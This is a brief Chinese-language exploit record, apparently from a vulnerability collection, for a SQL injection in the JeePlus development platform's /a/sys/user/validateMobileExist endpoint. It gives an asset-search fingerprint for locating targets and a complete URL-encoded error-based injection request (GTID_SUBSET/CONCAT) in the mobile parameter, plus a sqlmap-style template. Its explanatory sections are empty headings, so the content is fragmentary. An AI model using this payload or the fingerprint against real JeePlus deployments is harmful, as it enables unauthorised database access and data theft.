# JeePlus快速开发平台validateMobileExistSQL注入

- **系统**：JeePlus　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="JeePlus"`
- **请求**：`GET /a/sys/user/validateMobileExist?&mobile=1%27+AND+GTID_SUBSET%28CONCAT%280x71626b7171%2C%28SELECT+%28ELT%285680%3D5680%2C1%29%29%29%2C0x7176767671%29%2C5680%29--+ywwp HTTP/1.1`

**请求体 / payload**
```

qbkqq1qvvvq
sqlmap
GET /a/sys/user/validateMobileExist?&mobile=1 HTTP/1.1
Host:
```

**其他**
- JeePlus快速开发平台 validateMobileExist SQL注入: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * JeePlus快速开发平台